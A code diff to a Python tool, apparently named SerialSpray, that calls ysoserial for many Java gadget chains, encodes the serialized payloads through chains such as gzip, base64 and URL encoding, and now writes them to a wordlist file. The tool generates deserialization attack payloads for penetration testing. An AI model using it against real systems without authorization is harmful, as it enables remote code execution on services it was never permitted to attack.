@@ -123,6 +123,7 @@ def sys_cmd(cmd_syntax: list, input_bytes: bytes):
         logging.error('Error occurred during command execution: %s', stderr)
         sys.exit(3)
 
+    # Return output with no newlines or extra whitespace #
     return stdout.strip()
 
 
@@ -134,15 +135,40 @@ def main(config_obj: object):
     :param config_obj:  The program configuration instance.
     :return:  Nothing
     """
-    # Iterate through the tuple of ysoserial library names #
-    for library in config_obj.ysoserial_libs:
-        # Execute ysoserial with current iteration library and the specified payload #
-        ysoserial_out = check_output([config_obj.java_path, '-jar', str(config_obj.ysoserial_path),
-                                      library, config_obj.payload])
-        # Pass the serialized data to the output compression/encoding chain #
-        payload = out_chain_gen(ysoserial_out, config_obj)
+    print('*' * 72)
+    print(r'''
+  -_-/                       ,,         -_-/                           
+ (_ /                '   _   ||        (_ /                 _          
+(_ --_   _-_  ,._-_ \\  < \, ||       (_ --_  -_-_  ,._-_  < \, '\\/\\ 
+  --_ ) || \\  ||   ||  /-|| ||         --_ ) || \\  ||    /-||  || ;' 
+ _/  )) ||/    ||   || (( || ||        _/  )) || ||  ||   (( ||  ||/   
+(_-_-   \\,/   \\,  \\  \/\\ \\       (_-_-   ||-'   \\,   \/\\  |/    
+                                              |/                (      
+                                              '                  -_-
+''')
+    print('*' * 72)
+    try:
+        # Open the output wordlist as append bytes mode #
+        with config_obj.out_file.open('ab') as out_file:
+            # Iterate through the tuple of ysoserial library names #
+            for library in config_obj.ysoserial_libs:
+                # Execute ysoserial with current iteration library and the specified payload #
+                ysoserial_out = check_output([config_obj.java_path, '-jar',
+                                              str(config_obj.ysoserial_path), library,
+                                              config_obj.payload])
+                # Pass the serialized data to the output compression/encoding chain #
+                payload = out_chain_gen(ysoserial_out, config_obj)
+                # Print the resulting payload and write to the output file #
+                print(f'[+] {library} serialized payload generated with output compression/encoding'
+                      f' chain => {config_obj.chain_reference}')
+                out_file.write(payload + b'\n')
 
-        print(f'{library}:\n\n{payload.decode(errors="replace")}\n\n')
+    # If error occurs during file operation #
+    except OSError as file_err:
+        # Print error, log, and exit #
+        print_err(f'Error occurred during file operation: {file_err}')
+        logging.error('Error occurred during file operation: %s', file_err)
+        sys.exit(3)
 
 
 def print_err(msg: str):
@@ -166,6 +192,7 @@ class ProgramConfig:
         self.payload = None
         self.chain_reference = None
         self.out_chain = None
+        self.out_file = None
         self.re_url_upper = re.compile(r'%[0-9A-F]{2}')
         self.ysoserial_libs = ('BeanShell1',  'Click1', 'CommonsBeanutils1',
                                'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3',
@@ -289,6 +316,8 @@ if __name__ == '__main__':
     arg_parser.add_argument('out_chain', help='The compression/encoding chain the output is piped '
                                               'to. Supported methods: gzip, zlib, base64, '
                                               'base64-url, ascii-hex, url. Ex: \'gzip|base64|url\'')
+    arg_parser.add_argument('--out_file', help='Specify the output file where the payloads should '
+                                               'be stored on disk')
     parsed_args = arg_parser.parse_args()
 
     # Initialize the program configuration instance #
@@ -299,6 +328,14 @@ if __name__ == '__main__':
     conf_obj.payload = parsed_args.payload
     # Parse the various encodings as an encoding list
     conf_obj.validate_out_chain(parsed_args.out_chain)
+    # If an output file was specified #
+    if parsed_args.out_file:
+        # Validate output file before setting it in program config #
+        conf_obj.out_file = conf_obj.validate_file(parsed_args.out_file)
+    # If no output file was specified #
+    else:
+        # Set the default file path #
+        conf_obj.out_file = conf_obj.cwd / 'ss_wordlist.txt'
 
     # Set up the log file and logging facilities #
     logging.basicConfig(filename='SerialSpray.log', level=logging.DEBUG,
